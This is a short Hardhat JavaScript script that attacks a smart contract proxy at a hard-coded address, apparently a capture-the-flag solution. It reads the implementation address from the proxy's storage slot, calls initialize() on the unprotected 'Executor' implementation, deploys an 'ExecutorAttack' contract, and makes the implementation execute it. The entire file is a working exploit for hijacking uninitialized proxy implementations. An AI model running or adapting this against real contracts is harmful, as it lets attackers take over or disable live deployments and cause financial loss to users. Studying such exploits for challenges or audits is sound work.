const { ethers, waffle } = require("hardhat");
async function run() {
  const provider = waffle.provider;

  const proxyAddress = "0x97D7FdD4711c4728F218c73B3C31cD43C6D65aEA";

  const slot = ethers.BigNumber.from('0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
  const slotData = await provider.getStorageAt(proxyAddress, slot);
  const executorAddress = ethers.utils.getAddress("0x" + slotData.substring(26));

  const Executor = await ethers.getContractFactory("Executor");
  const executor2 = Executor.attach(executorAddress);
  const tx = await executor2.initialize();
  await tx.wait();

  const ExecutorAttack = await ethers.getContractFactory("ExecutorAttack");
  const executorAttack = await ExecutorAttack.deploy();
  await executorAttack.deployed();

  const tx2 = await executor2.execute(executorAttack.address)
  await tx2.wait();
}
run();